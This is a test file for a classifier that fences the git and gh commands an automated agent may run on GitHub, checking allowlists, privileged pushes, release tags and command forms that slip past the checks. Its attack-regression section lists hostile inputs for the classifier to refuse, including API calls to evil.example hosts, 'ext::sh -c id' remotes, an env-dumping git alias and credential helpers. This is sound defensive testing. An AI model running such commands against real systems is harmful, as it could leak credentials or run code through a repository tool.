import { describe, expect, it } from "vitest";
import {
  DEFAULT_GITHUB_PRIVILEGED_TOGGLES,
  DEFAULT_GITHUB_WRITE_IDENTITY_POLICY,
  classifyGitHubCommand,
  ghCommandMayWrite,
  parseGhCommand,
  gitNetworkArguments,
  gitPushDestinations,
  graphqlOperationTypes,
  parseGitHubDestination,
  isGitHubRepositoryAllowed,
  matchesGitHubRepositoryPattern,
  normalizeGitHubRepository,
  parseGitHubWriteIdentityPolicy,
  resolveGitHubWriteIdentity,
  resolveGitHubWriteIdentityForOther,
  type GitHubWriteIdentityPolicy,
} from "./github-write-identity.js";

const vllnt: GitHubWriteIdentityPolicy = {
  ...DEFAULT_GITHUB_WRITE_IDENTITY_POLICY,
  default: { commit: "bot", push: "bot", pullRequest: "bot", comment: "bot" },
  overrides: [{ match: "vllnt/*", commit: "user", push: "user", pullRequest: "user", comment: "bot" }],
};

const anthm = {
  default: { commit: "user", push: "user", pullRequest: "user", comment: "user" },
  userSource: "app",
  allowedRepositories: ["Anthm-FR/songtrivia", "Anthm-FR/linkzic.wiki", "anthm-fr/linkzic"],
  userLogin: "agent-owner",
  installationPermissions: { contents: "write", metadata: "read", actions: "write", deployments: "write" },
};

describe("parseGitHubWriteIdentityPolicy", () => {
  it("accepts a complete policy and fills omitted optional fields", () => {
    expect(parseGitHubWriteIdentityPolicy({ default: DEFAULT_GITHUB_WRITE_IDENTITY_POLICY.default }))
      .toEqual(DEFAULT_GITHUB_WRITE_IDENTITY_POLICY);
    expect(parseGitHubWriteIdentityPolicy({ ...vllnt, overrides: [{ match: " vllnt/* ", comment: "bot" }] }).overrides)
      .toEqual([{ match: "vllnt/*", comment: "bot" }]);
  });

  it("rejects unknown kinds, actions, patterns and fallbacks", () => {
    expect(() => parseGitHubWriteIdentityPolicy({ default: { ...vllnt.default, push: "admin" } })).toThrow(/push/);
    expect(() => parseGitHubWriteIdentityPolicy({ default: { ...vllnt.default, merge: "bot" } })).toThrow(/accept only/);
    expect(() => parseGitHubWriteIdentityPolicy({ ...vllnt, overrides: [{ match: "vllnt" }] })).toThrow(/owner\/name/);
    expect(() => parseGitHubWriteIdentityPolicy({ ...vllnt, overrides: [{ match: "a/b", deploy: "bot" }] })).toThrow(/deploy/);
    expect(() => parseGitHubWriteIdentityPolicy({ ...vllnt, missingUserConnection: "ask" })).toThrow(/fail or use_bot/);
    expect(() => parseGitHubWriteIdentityPolicy({ ...vllnt, userId: "someone" })).toThrow(/userId/);
  });

  it("keeps release, tag pushes and default-branch pushes off unless turned on", () => {
    const policy = parseGitHubWriteIdentityPolicy(anthm);
    expect(policy.privileged).toEqual({
      adminMerge: true, deploymentApproval: true, workflowDispatch: true, wiki: true,
      release: false, tagPush: false, pushToMain: false, editWorkflows: false,
    });
    expect(DEFAULT_GITHUB_PRIVILEGED_TOGGLES.release).toBe(false);
    expect(DEFAULT_GITHUB_PRIVILEGED_TOGGLES.tagPush).toBe(false);
    expect(parseGitHubWriteIdentityPolicy({ ...anthm, privileged: { tagPush: true, adminMerge: false } }).privileged)
      .toMatchObject({ tagPush: true, adminMerge: false, release: false });
    expect(() => parseGitHubWriteIdentityPolicy({ ...anthm, privileged: { deploy: true } })).toThrow(/deploy/);
    expect(() => parseGitHubWriteIdentityPolicy({ ...anthm, privileged: { release: "yes" } })).toThrow(/release/);
  });

  it("normalizes the allowlist, folds wikis and defaults the throttle, kill switch and footer", () => {
    const policy = parseGitHubWriteIdentityPolicy(anthm);
    expect(policy.allowedRepositories).toEqual(["anthm-fr/songtrivia", "anthm-fr/linkzic"]);
    expect(policy).toMatchObject({ enabled: true, throttle: { perMinute: 30, perHour: 300 }, bodyFooter: false, userSource: "app" });
    expect(parseGitHubWriteIdentityPolicy({ default: vllnt.default }).bodyFooter).toBe(true);
    expect(() => parseGitHubWriteIdentityPolicy({ ...anthm, allowedRepositories: ["anthm-fr/*"] })).toThrow(/exact owner\/name/);
    // Writes can be staged: the installation covers more repositories than the write allowlist.
    expect(parseGitHubWriteIdentityPolicy({ ...anthm, installationRepositories: ["anthm-fr/songtrivia", "anthm-fr/linkzic", "anthm-fr/wordzic"] }).installationRepositories)
      .toEqual(["anthm-fr/songtrivia", "anthm-fr/linkzic", "anthm-fr/wordzic"]);
    expect(() => parseGitHubWriteIdentityPolicy({ ...anthm, installationRepositories: ["anthm-fr/songtrivia"] })).toThrow(/installation repositories too: anthm-fr\/linkzic/);
    expect(() => parseGitHubWriteIdentityPolicy({ ...anthm, throttle: { perMinute: 0 } })).toThrow(/perMinute/);
    expect(() => parseGitHubWriteIdentityPolicy({ ...anthm, throttle: { perMinute: 50, perHour: 40 } })).toThrow(/perHour/);
    expect(() => parseGitHubWriteIdentityPolicy({ ...anthm, enabled: "no" })).toThrow(/enabled/);
  });

  it("requires a fenced, non-falling-back setup for the App user", () => {
    expect(() => parseGitHubWriteIdentityPolicy({ ...anthm, default: { ...anthm.default, comment: "bot" } })).toThrow(/bot only reads/);
    expect(() => parseGitHubWriteIdentityPolicy({ ...anthm, overrides: [{ match: "anthm-fr/*", push: "bot" }] })).toThrow(/bot only reads/);
    expect(() => parseGitHubWriteIdentityPolicy({ ...anthm, missingUserConnection: "use_bot" })).toThrow(/never falls back/);
    expect(() => parseGitHubWriteIdentityPolicy({ ...anthm, allowedRepositories: [] })).toThrow(/allowed repository/);
    expect(() => parseGitHubWriteIdentityPolicy({ ...anthm, userLogin: null })).toThrow(/userLogin/);
    expect(() => parseGitHubWriteIdentityPolicy({ ...anthm, installationPermissions: null })).toThrow(/installation permissions/);
    expect(() => parseGitHubWriteIdentityPolicy({ ...anthm, installationPermissions: { administration: "read" } })).toThrow(/administration/);
    expect(() => parseGitHubWriteIdentityPolicy({ ...anthm, installationPermissions: { statuses: "write" } })).toThrow(/statuses/);
    expect(() => parseGitHubWriteIdentityPolicy({ ...anthm, installationPermissions: { secrets: "read" } })).toThrow(/secrets/);
  });
});

describe("repository fence", () => {
  it.each([
    ["Anthm-FR/linkzic", { repository: "anthm-fr/linkzic", wiki: false }],
    ["Anthm-FR/linkzic.wiki", { repository: "anthm-fr/linkzic", wiki: true }],
    ["Anthm-FR/linkzic.wiki.git", { repository: "anthm-fr/linkzic", wiki: true }],
    ["anthm-fr/linkzic.git", { repository: "anthm-fr/linkzic", wiki: false }],
    ["anthm-fr", null],
    ["../..", null],
    ["a/.wiki", null],
  ])("normalizes %s", (value, expected) => {
    expect(normalizeGitHubRepository(value)).toEqual(expected);
  });

  it("allows only exact repositories and their wikis, never look-alikes", () => {
    const policy = parseGitHubWriteIdentityPolicy(anthm);
    for (const name of ["Anthm-FR/songtrivia", "anthm-fr/songtrivia.wiki", "anthm-fr/linkzic.wiki.git"]) {
      expect(isGitHubRepositoryAllowed(policy, name), name).toBe(true);
    }
    for (const name of ["anthm-fr/songtrivia-old", "anthm-fr/songtrivi", "anthm-fr-evil/songtrivia", "vllnt/infrastructure", "anthm-fr/spotzic", null]) {
      expect(isGitHubRepositoryAllowed(policy, name), String(name)).toBe(false);
    }
    expect(isGitHubRepositoryAllowed({ allowedRepositories: [] }, "vllnt/anything")).toBe(true);
  });
});

describe("resolveGitHubWriteIdentity", () => {
  it("keeps today's behaviour without a policy", () => {
    expect(resolveGitHubWriteIdentity(null, { repository: "a/b", action: "push", surface: "runtime" })).toBe("user");
    expect(resolveGitHubWriteIdentity(null, { repository: "a/b", action: "comment", surface: "plugin" })).toBe("bot");
  });

  it("applies the first matching override per action, case-insensitively", () => {
    const resolve = (repository: string, action: "push" | "comment") =>
      resolveGitHubWriteIdentity(vllnt, { repository, action, surface: "runtime" });
    expect(resolve("VLLNT/Paperclip", "push")).toBe("user");
    expect(resolve("vllnt/paperclip", "comment")).toBe("bot");
    expect(resolve("other/repo", "push")).toBe("bot");
    expect(matchesGitHubRepositoryPattern("vllnt/*", "vllnt/a/b")).toBe(false);
    expect(matchesGitHubRepositoryPattern("*/docs", "acme/docs")).toBe(true);
    expect(matchesGitHubRepositoryPattern("a.b/c", "aXb/c")).toBe(false);
  });

  it("writes unclassified operations as the user only when every action does", () => {
    expect(resolveGitHubWriteIdentityForOther(vllnt, { repository: "vllnt/x", surface: "runtime" })).toBe("bot");
    expect(resolveGitHubWriteIdentityForOther(DEFAULT_GITHUB_WRITE_IDENTITY_POLICY, { repository: "vllnt/x", surface: "runtime" })).toBe("user");
    expect(resolveGitHubWriteIdentityForOther(null, { repository: null, surface: "runtime" })).toBe("user");
  });
});

describe("classifyGitHubCommand", () => {
  const read = { access: "read", action: null, privileged: [] };
  const local = { access: "none", action: null, privileged: [] };
  const write = (action: string, ...privileged: string[]) => ({ access: "write", action, privileged });

  it.each([
    [["push", "origin", "feature/x"], write("push", "editWorkflows")],
    [["-C", "repo", "-c", "x=y", "commit", "-m", "x"], { access: "none", action: "commit", privileged: [] }],
    [["cherry-pick", "abc"], { access: "none", action: "commit", privileged: [] }],
    [["pull", "--rebase"], { access: "read", action: "commit", privileged: [] }],
    [["fetch", "origin"], read],
    [["clone", "https://github.com/o/r.git"], read],
    [["ls-remote", "origin"], read],
    [["status"], local],
    [["tag", "-a", "v1", "-m", "x"], local],
    [["log", "--oneline"], local],
    [[], local],
  ] as const)("git %j", (args, expected) => {
    // Without the checkout's answer, a push counts as changing workflow files.
    expect(classifyGitHubCommand("git", args, { currentBranch: "feature/x" })).toEqual(expected);
  });

  it("marks every network command on a wiki remote as a wiki action", () => {
    const remote = "https://github.com/Anthm-FR/linkzic.wiki.git";
    expect(classifyGitHubCommand("git", ["push", "origin", "master"], { remote, currentBranch: "master", touchesWorkflows: false }))
      .toEqual(write("push", "pushToMain", "wiki"));
    expect(classifyGitHubCommand("git", ["clone", remote], { remote })).toEqual({ access: "read", action: null, privileged: ["wiki"] });
    expect(classifyGitHubCommand("git", ["status"], { remote })).toEqual(local);
  });

  it.each([
    // Tags, explicit or resolved in the checkout, need tagPush.
    [["origin", "v1.2.0"], { refs: { "v1.2.0": "refs/tags/v1.2.0" } }, ["refs/tags/v1.2.0"]],
    [["origin", "engine@1.4.0"], { refs: { "engine@1.4.0": "refs/tags/engine@1.4.0" } }, ["refs/tags/engine@1.4.0"]],
    [["origin", "tag", "v2"], {}, ["refs/tags/v2"]],
    [["--tags", "origin"], {}, ["refs/tags/*"]],
    [["--follow-tags"], { currentBranch: "feat" }, ["refs/tags/*", "refs/heads/feat"]],
    [["origin", "HEAD:refs/tags/x"], {}, ["refs/tags/x"]],
    [["origin", "v1:v1-copy"], { refs: { v1: "refs/tags/v1" } }, ["refs/tags/v1-copy"]],
    // Default branch, explicit, implied by HEAD or the current branch, deleted, or every branch.
    [["origin", "main"], {}, ["refs/heads/main"]],
    [["origin", "+HEAD:master"], { currentBranch: "feat" }, ["refs/heads/master"]],
    [["origin", "HEAD"], { currentBranch: "main" }, ["refs/heads/main"]],
    [[], { currentBranch: "main" }, ["refs/heads/main"]],
    [["origin", ":main"], {}, ["refs/heads/main"]],
    [["origin", "--delete", "main"], {}, ["refs/heads/main"]],
    [["--all", "origin"], {}, ["refs/heads/*"]],
    [["--mirror", "origin"], {}, ["refs/heads/*", "refs/tags/*"]],
    // Unknown current branch counts as every branch.
    [["origin"], {}, ["refs/heads/*"]],
    // Ordinary branches.
    [["-u", "origin", "feature/x"], {}, ["refs/heads/feature/x"]],
    [["--force-with-lease", "-o", "ci.skip", "origin", "fix:fix"], {}, ["refs/heads/fix"]],
  ] as const)("push %j -> %j", (args, context, expected) => {
    expect(gitPushDestinations(args, context as never)).toEqual(expected);
  });

  it("classifies tag, default-branch and workflow pushes as privileged", () => {
    const clean = { touchesWorkflows: false };
    expect(classifyGitHubCommand("git", ["push", "origin", "v1.2.0"], { ...clean, refs: { "v1.2.0": "refs/tags/v1.2.0" } }))
      .toEqual(write("push", "tagPush"));
    expect(classifyGitHubCommand("git", ["push", "origin", "HEAD:main"], clean)).toEqual(write("push", "pushToMain"));
    expect(classifyGitHubCommand("git", ["push"], { ...clean, currentBranch: "feat/a" })).toEqual(write("push"));
    expect(classifyGitHubCommand("git", ["push", "origin", "feat/a"], { touchesWorkflows: true })).toEqual(write("push", "editWorkflows"));
    expect(classifyGitHubCommand("git", ["push", "origin", "feat/a"], { touchesWorkflows: null })).toEqual(write("push", "editWorkflows"));
    expect(classifyGitHubCommand("git", ["push", "origin", "--delete", "feat/a"])).toEqual({ ...write("push"), branchRewrites: ["feat/a"] });
  });

  it("denies release tags (name@version) and bulk tag pushes whatever the toggles", () => {
    const releaseTag = /release workflow/;
    const engineTag = classifyGitHubCommand("git", ["push", "origin", "engine@1.4.0"], { refs: { "engine@1.4.0": "refs/tags/engine@1.4.0" }, touchesWorkflows: false });
    expect(engineTag).toMatchObject({ access: "write", privileged: ["tagPush"], denied: expect.stringMatching(releaseTag) });
    expect(classifyGitHubCommand("git", ["push", "origin", "HEAD:refs/tags/web@2.0.0"]).denied).toMatch(releaseTag);
    expect(classifyGitHubCommand("git", ["push", "origin", "--delete", "refs/tags/web@2.0.0"]).denied).toMatch(releaseTag);
    expect(classifyGitHubCommand("git", ["push", "--tags", "origin"]).denied).toMatch(/by name/);
    expect(classifyGitHubCommand("git", ["push", "--follow-tags"], { currentBranch: "feat" }).denied).toMatch(/by name/);
    expect(classifyGitHubCommand("gh", ["release", "create", "engine@1.4.0", "--generate-notes"]).denied).toMatch(releaseTag);
    expect(classifyGitHubCommand("gh", ["api", "repos/o/r/releases", "-f", "tag_name=web@1"]).denied).toMatch(releaseTag);
    expect(classifyGitHubCommand("gh", ["api", "repos/o/r/git/refs", "-f", "ref=refs/tags/engine@1", "-f", "sha=abc"]).denied).toMatch(releaseTag);
    expect(classifyGitHubCommand("gh", ["api", "-X", "DELETE", "repos/o/r/git/refs/tags/engine%401"]).denied).toMatch(releaseTag);
    expect(classifyGitHubCommand("gh", ["release", "create", "v1.0.0"]).denied).toBeUndefined();
    expect(classifyGitHubCommand("git", ["push", "origin", "v1.0.0"], { refs: { "v1.0.0": "refs/tags/v1.0.0" } }).denied).toBeUndefined();
  });

  it("does not let other command forms skip privileged checks (review findings)", () => {
    const clean = { touchesWorkflows: false };
    // Flag forms of --admin, and flags before the verb.
    expect(classifyGitHubCommand("gh", ["pr", "merge", "5", "--admin=true"])).toEqual(write("pullRequest", "adminMerge"));
    expect(classifyGitHubCommand("gh", ["pr", "merge", "5", "--admin=false"])).toEqual(write("pullRequest"));
    expect(classifyGitHubCommand("gh", ["pr", "-R", "o/r", "merge", "5", "--admin"])).toEqual(write("pullRequest", "adminMerge"));
    expect(classifyGitHubCommand("gh", ["pr", "-R", "o/r", "view", "5"])).toEqual(read);
    // Attached method and field forms, full URLs and encoded refs in gh api.
    expect(classifyGitHubCommand("gh", ["api", "-XPUT", "repos/o/r/pulls/1/merge"])).toEqual(write("pullRequest", "adminMerge"));
    expect(classifyGitHubCommand("gh", ["api", "-X", "POST", "https://api.github.com/repos/o/r/git/refs", "-f", "ref=refs/tags/pkg@1"]).denied).toMatch(/release workflow/);
    expect(classifyGitHubCommand("gh", ["api", "repos/o/r/git/refs", "-fref=refs/tags/pkg@1", "-fsha=abc"]).denied).toMatch(/release workflow/);
    expect(classifyGitHubCommand("gh", ["api", "repos/o/r/git/refs", "--input", "body.json"]).denied).toMatch(/Name this request's fields/);
    expect(classifyGitHubCommand("gh", ["api", "-X", "POST", "repos/o/r/releases", "--input", "release.json"]).denied).toMatch(/Name this request's fields/);
    expect(classifyGitHubCommand("gh", ["api", "-X", "PATCH", "repos/o/r/git/refs/heads%2Fmain", "-f", "sha=abc"])).toEqual(write("push", "pushToMain"));
    expect(classifyGitHubCommand("gh", ["api", "-X", "POST", "https://evil.example/repos/o/r/issues"]).denied).toMatch(/only to github\.com/);
    expect(classifyGitHubCommand("gh", ["api", "-X", "POST", "repos/o/r/check-runs/9/rerequest"])).toEqual(write("other", "workflowDispatch"));
    // Release tags behind value flags or --tag.
    expect(classifyGitHubCommand("gh", ["release", "create", "--title", "x", "pkg@1.0.0"]).denied).toMatch(/release workflow/);
    expect(classifyGitHubCommand("gh", ["release", "-R", "o/r", "create", "engine@2"]).denied).toMatch(/release workflow/);
    expect(classifyGitHubCommand("gh", ["release", "edit", "v1", "--tag", "engine@2"]).denied).toMatch(/release workflow/);
    expect(classifyGitHubCommand("gh", ["release", "create", "v1", "--notes", "thanks @someone"]).denied).toBeUndefined();
    // git refspec forms: DWIM heads/ and tags/, patterns, and implicit push config.
    expect(classifyGitHubCommand("git", ["push", "origin", "feature:heads/main"], clean)).toEqual(write("push", "pushToMain"));
    expect(classifyGitHubCommand("git", ["push", "origin", "v1:tags/v1"], clean)).toEqual(write("push", "tagPush"));
    expect(classifyGitHubCommand("git", ["push", "origin", "refs/heads/m*:refs/heads/m*"], clean)).toEqual(write("push", "pushToMain"));
    expect(classifyGitHubCommand("git", ["push", "origin", "refs/tags/pkg*:refs/tags/pkg*"], clean).denied).toMatch(/by name/);
    expect(classifyGitHubCommand("git", ["push"], { ...clean, currentBranch: "feat", implicitPush: true }).denied).toMatch(/by name/);
  });

  it.each([
    [["pr", "create", "--fill"], write("pullRequest")],
    [["pr", "merge", "1", "--squash"], write("pullRequest")],
    [["pr", "merge", "1", "--admin", "--squash"], write("pullRequest", "adminMerge")],
    [["pr", "comment", "1", "-b", "x"], write("comment")],
    [["pr", "review", "1", "--approve"], write("comment")],
    [["issue", "comment", "1", "-b", "x"], write("comment")],
    [["pr", "view", "1"], read],
    [["pr", "checks"], read],
    [["issue", "create", "-t", "x"], write("other")],
    [["release", "create", "v1"], write("other", "release")],
    [["release", "list"], read],
    [["workflow", "run", "deploy.yml"], write("other", "workflowDispatch")],
    [["run", "rerun", "123"], write("other", "workflowDispatch")],
    [["run", "watch", "123"], read],
    [["project", "item-edit", "--id", "x"], write("project")],
    [["project", "item-list", "34", "--owner", "Anthm-FR"], read],
    [["repo", "clone", "o/r"], read],
    [["repo", "sync"], write("push", "pushToMain")],
    [["repo", "fork", "o/r"], write("other")],
    [["search", "issues", "x"], read],
    [["auth", "status"], read],
    [["codespace", "create"], write("other")],
    [["api", "repos/o/r/issues/1/comments", "-f", "body=x"], write("comment")],
    [["api", "-X", "POST", "/repos/o/r/pulls"], write("pullRequest")],
    [["api", "--method=PUT", "repos/o/r/pulls/2/merge"], write("pullRequest", "adminMerge")],
    [["api", "repos/o/r/pulls/comments/9/replies", "--raw-field", "body=x"], write("comment")],
    [["api", "-X", "PATCH", "repos/o/r/issues/1"], write("other")],
    [["api", "-X", "POST", "repos/o/r/actions/runs/77/pending_deployments", "-F", "environment_ids[]=1", "-f", "state=approved"], write("other", "deploymentApproval")],
    [["api", "-X", "POST", "repos/o/r/actions/workflows/deploy.yml/dispatches", "-f", "ref=main"], write("other", "workflowDispatch")],
    [["api", "-X", "POST", "repos/o/r/releases", "-f", "tag_name=v1"], write("other", "release")],
    [["api", "repos/o/r/git/refs", "-f", "ref=refs/tags/v1", "-f", "sha=abc"], write("push", "tagPush")],
    [["api", "-X", "PATCH", "repos/o/r/git/refs/heads/main", "-f", "sha=abc"], write("push", "pushToMain")],
    [["api", "-X", "DELETE", "repos/o/r/git/refs/heads/feat"], { ...write("push"), branchRewrites: ["feat"] }],
    [["api", "-X", "PUT", "repos/o/r/contents/README.md", "-f", "message=x", "-f", "content=eA=="], write("commit", "pushToMain")],
    [["api", "-X", "PUT", "repos/o/r/contents/README.md", "-f", "branch=docs", "-f", "message=x"], write("commit")],
    [["api", "-X", "PUT", "repos/o/r/contents/.github/workflows/ci.yml", "-f", "branch=docs"], write("commit", "editWorkflows")],
    [["api", "-H", "Accept: application/json", "repos/o/r/pulls"], read],
    [["api", "graphql", "-f", 'query=mutation{resolveReviewThread(input:{threadId:"T"}){clientMutationId}}'], write("comment")],
    [["api", "graphql", "-f", "query=query{viewer{login}}"], read],
    [["api", "repos/o/r/pulls"], read],
  ] as const)("gh %j", (args, expected) => {
    expect(classifyGitHubCommand("gh", args)).toEqual(expected);
  });
});

// ---------------------------------------------------------------------------
// Security review, round 2: each test is an attack that the previous classifier let through.
// ---------------------------------------------------------------------------

describe("security review round 2 (attack regressions)", () => {
  const read = { access: "read", action: null, privileged: [] };
  const write = (action: string, ...privileged: string[]) => ({ access: "write", action, privileged });

  it("F1: refuses gh api requests to any host but api.github.com, reads included", () => {
    for (const args of [
      ["api", "https://evil.example/repos/o/r/issues"],
      ["api", "-X", "POST", "https://evil.example/repos/o/r/issues"],
      ["api", "https://api.github.com.evil.example/user"],
      ["api", "https://api.github.com@evil.example/user"],
      ["api", "http://api.github.com/user"],
      ["api", "https://uploads.github.com/repos/o/r/releases/1/assets"],
      ["api", "--hostname", "evil.example", "repos/o/r/pulls"],
      ["api", "--hostname=github.localhost", "user"],
      ["api", "--hostname", "tenant.ghe.com", "user"],
    ]) expect(classifyGitHubCommand("gh", args).denied, args.join(" ")).toMatch(/only to github\.com/);
    expect(classifyGitHubCommand("gh", ["api", "https://api.github.com/repos/o/r/pulls"])).toEqual(read);
    expect(classifyGitHubCommand("gh", ["api", "--hostname", "github.com", "repos/o/r/pulls"])).toEqual(read);
  });

  it("F2: classifies GraphQL by parsing the document; opaque or unreadable bodies are refused", () => {
    const mutation = 'mutation{addStar(input:{starrableId:"x"}){clientMutationId}}';
    for (const args of [
      ["api", "graphql", "-F", "query=@mutation.graphql"],
      ["api", "graphql", "--field", "query=@-"],
      ["api", "graphql", "--input", "-"],
      ["api", "graphql", "--input=body.json"],
    ]) expect(classifyGitHubCommand("gh", args).denied, args.join(" ")).toMatch(/file or stdin/);
    // A mutation anywhere in the document can run (operationName picks it): a write.
    for (const query of [
      `query A{viewer{login}} ${mutation}`,
      `# a comment\n${mutation}`,
      `,${mutation}`,
      `﻿${mutation}`,
      `fragment F on User{login} ${mutation}`,
      "subscription{x}",
      'query Q($a: String = "mutation{") { viewer { login } } mutation M { x }',
    ]) {
      const result = classifyGitHubCommand("gh", ["api", "graphql", "-f", `query=${query}`, "-f", "operationName=M"]);
      expect(result.access, query).toBe("write");
      // addStar and x are not mutations Paperclip can fence (round 2b, R1): refused.
      expect(result.denied, query).toBeDefined();
    }
    for (const query of ["query{viewer{login}", "@mutation.graphql", "type X { a: Int }", "extend schema @x", ""]) {
      expect(classifyGitHubCommand("gh", ["api", "graphql", "-f", `query=${query}`]).denied, query).toMatch(/cannot read this GraphQL/);
    }
    expect(classifyGitHubCommand("gh", ["api", "graphql"]).denied).toMatch(/cannot read this GraphQL/);
    for (const args of [
      ["api", "graphql", "-f", "query={viewer{login}}"],
      ["api", "graphql", "-f", 'query=query($q: String = "mutation {}") { search(query: $q, type: ISSUE, first: 1) { issueCount } } # mutation'],
      ["api", "https://api.github.com/graphql", "-f", "query=query{viewer{login}}"],
      ["api", "/graphql", "-f", "query=query{viewer{login}}"],
    ]) expect(classifyGitHubCommand("gh", args), args.join(" ")).toEqual(read);
    expect(graphqlOperationTypes('query A { a } mutation B { b(x: {y: "}"}) { c } }')).toEqual(["query", "mutation"]);
    expect(graphqlOperationTypes('{ a(s: """ block "" \\""" }} """) }')).toEqual(["query"]);
  });

  it("F2: never ignores REST values Paperclip cannot see or method spellings gh accepts", () => {
    for (const args of [
      ["api", "repos/o/r/git/refs", "-F", "ref=@ref.txt", "-f", "sha=abc"],
      ["api", "-X", "POST", "repos/o/r/releases", "-F", "tag_name=@tag.txt"],
      ["api", "repos/o/r/git/tags", "-F", "tag=@tag.txt", "-f", "object=abc"],
      ["api", "-X", "PUT", "repos/o/r/contents/a.txt", "-F", "branch=@b.txt", "-f", "message=x"],
    ]) expect(classifyGitHubCommand("gh", args).denied, args.join(" ")).toMatch(/file or stdin/);
    expect(classifyGitHubCommand("gh", ["api", "-X=POST", "repos/o/r/issues"])).toEqual(write("other"));
    expect(classifyGitHubCommand("gh", ["api", "-iXPOST", "repos/o/r/issues"])).toEqual(write("other"));
    expect(classifyGitHubCommand("gh", ["api", "-X", "PROPFIND", "repos/o/r/issues"])).toEqual(write("other"));
    expect(classifyGitHubCommand("gh", ["api", "-X", "POST", "repos/o/r/releases", "-f=tag_name=engine@1"]).denied).toMatch(/release workflow/);
    // gh fills {branch} from the checkout: a write may not let it name the ref (round 2e).
    expect(classifyGitHubCommand("gh", ["api", "-X", "PATCH", "repos/{owner}/{repo}/git/refs/heads/{branch}", "-f", "sha=abc"]).denied).toMatch(/instead of gh placeholders/);
    expect(classifyGitHubCommand("gh", ["api", "-Z", "repos/o/r"]).denied).toMatch(/does not know/);
  });

  it("F3: runs only known git commands; network plumbing, helpers, aliases and unknown commands are refused", () => {
    for (const args of [
      ["send-pack", "https://github.com/o/r", "main"], ["receive-pack", "."], ["fetch-pack", "https://github.com/o/r"], ["upload-pack", "."],
      ["http-push", "https://github.com/o/r/", "main"], ["remote-https", "origin", "https://github.com/o/r"], ["remote-ext", "x", "sh -c env"],
      ["credential", "fill"], ["credential-store", "get"], ["-c", "alias.x=!env", "x"], ["frobnicate"], ["daemon"], ["upload-archive", "."],
      ["archive", "--remote", "https://github.com/o/r", "HEAD"], ["remote", "update"], ["remote", "show", "origin"],
      ["remote", "add", "-f", "x", "https://github.com/o/r"], ["request-pull", "v1", "https://github.com/o/r"], ["maintenance", "run"],
      ["send-email", "x.patch"],
    ]) {
      const result = classifyGitHubCommand("git", args);
      expect(result.denied, args.join(" ")).toMatch(/cannot check where that command connects/);
      expect(result.access, args.join(" ")).not.toBe("none");
    }
    for (const args of [["status"], ["log", "-1"], ["diff"], ["tag", "-a", "v1", "-m", "x"], ["remote", "-v"], ["remote", "add", "up", "https://github.com/o/r"],
      ["submodule", "status"], ["worktree", "list"], ["stash"], ["archive", "HEAD"], ["--version"], []]) {
      expect(classifyGitHubCommand("git", args), args.join(" ")).toEqual({ access: "none", action: null, privileged: [] });
    }
    expect(classifyGitHubCommand("git", ["submodule", "update", "--init"])).toEqual(read);
    expect(classifyGitHubCommand("git", ["lfs", "pull"])).toEqual(read);
    expect(classifyGitHubCommand("git", ["lfs", "push", "origin", "main"])).toEqual(write("push"));
    expect(classifyGitHubCommand("git", ["commit-tree", "HEAD^{tree}"])).toEqual({ access: "none", action: "commit", privileged: [] });
  });

  it("F8: detects wikis after parsing and decoding the remote, and never on look-alikes", () => {
    const parse = (value: string) => parseGitHubDestination(value, "git");
    for (const value of [
      "https://github.com/Anthm-FR/songtrivia.wiki.git", "https://github.com/Anthm-FR/SongTrivia.WIKI.git", "https://github.com/Anthm-FR/songtrivia.wiki",
      "https://github.com/Anthm-FR/songtrivia.wiki.git/", "https://github.com/Anthm-FR/songtrivia%2Ewiki.git", "https://github.com/Anthm-FR/songtrivia.wik%69.git",
      "git@github.com:Anthm-FR/songtrivia.wiki.git", "ssh://git@github.com/Anthm-FR/songtrivia.wiki.git", "https://x-access-token@www.github.com/Anthm-FR/songtrivia.wiki.git",
    ]) expect(parse(value), value).toEqual({ kind: "github", repository: "anthm-fr/songtrivia", wiki: true });
    expect(parse("https://github.com/Anthm-FR/songtrivia-old.wiki.git")).toEqual({ kind: "github", repository: "anthm-fr/songtrivia-old", wiki: true });
    expect(parse("https://github.com/Anthm-FR/songtrivia.wiki.evil")).toEqual({ kind: "github", repository: "anthm-fr/songtrivia.wiki.evil", wiki: false });
    for (const value of ["https://github.com/Anthm-FR/songtrivia.wiki.git?x=1", "https://github.com/Anthm-FR/songtrivia.wiki.git#x", "https://github.com/Anthm-FR/songtrivia%2Fx.wiki.git",
      "https://github.com/Anthm-FR/songtrivia%252Ewiki.git", "https://github.com.evil.example/Anthm-FR/songtrivia.wiki.git"]) {
      expect(parse(value).kind, value).toBe("foreign");
    }
    expect(classifyGitHubCommand("git", ["push", "origin", "feat"], { remote: "https://github.com/Anthm-FR/songtrivia%2Ewiki.git", touchesWorkflows: false, currentBranch: "feat" }).privileged).toEqual(["wiki"]);
    expect(classifyGitHubCommand("git", ["push", "origin", "feat"], { remote: "https://github.com/Anthm-FR/songtrivia.wiki.evil", touchesWorkflows: false, currentBranch: "feat" }).privileged).toEqual([]);
  });

  it.each([
    ["https://github.com/vllnt/paperclip.git", "git", { kind: "github", repository: "vllnt/paperclip", wiki: false }],
    ["https://x-access-token@github.com/vllnt/paperclip", "git", { kind: "github", repository: "vllnt/paperclip", wiki: false }],
    ["git@github.com:vllnt/paperclip.git", "git", { kind: "github", repository: "vllnt/paperclip", wiki: false }],
    ["ssh://git@github.com:22/vllnt/paperclip.git", "git", { kind: "github", repository: "vllnt/paperclip", wiki: false }],
    ["/srv/mirror.git", "git", { kind: "local" }],
    ["../mirror", "git", { kind: "local" }],
    ["file:///srv/mirror.git", "git", { kind: "local" }],
    ["vllnt/paperclip", "git", { kind: "local" }],
    ["vllnt/paperclip", "gh", { kind: "github", repository: "vllnt/paperclip", wiki: false }],
    ["github.com/vllnt/paperclip", "gh", { kind: "github", repository: "vllnt/paperclip", wiki: false }],
    ["https://github.com/vllnt/paperclip", "gh", { kind: "github", repository: "vllnt/paperclip", wiki: false }],
  ] as const)("reads %s (%s) as a destination", (value, program, expected) => {
    expect(parseGitHubDestination(value, program)).toEqual(expected);
  });

  it.each([
    ["https://gitlab.com/vllnt/paperclip.git", "git"], ["git@gitlab.com:vllnt/paperclip.git", "git"], ["http://github.com/vllnt/paperclip", "git"],
    ["git://github.com/vllnt/paperclip", "git"], ["https://github.com:8443/vllnt/paperclip", "git"], ["ssh://git@ssh.github.com:443/vllnt/paperclip", "git"],
    ["ext::sh -c id", "git"], ["fd::3", "git"], ["https://github.com/vllnt", "git"], ["tenant.ghe.com/vllnt/paperclip", "gh"], ["../..", "gh"], ["", "gh"],
  ] as const)("refuses %s (%s) as foreign", (value, program) => {
    expect(parseGitHubDestination(value, program).kind).toBe("foreign");
  });
});

// ---------------------------------------------------------------------------
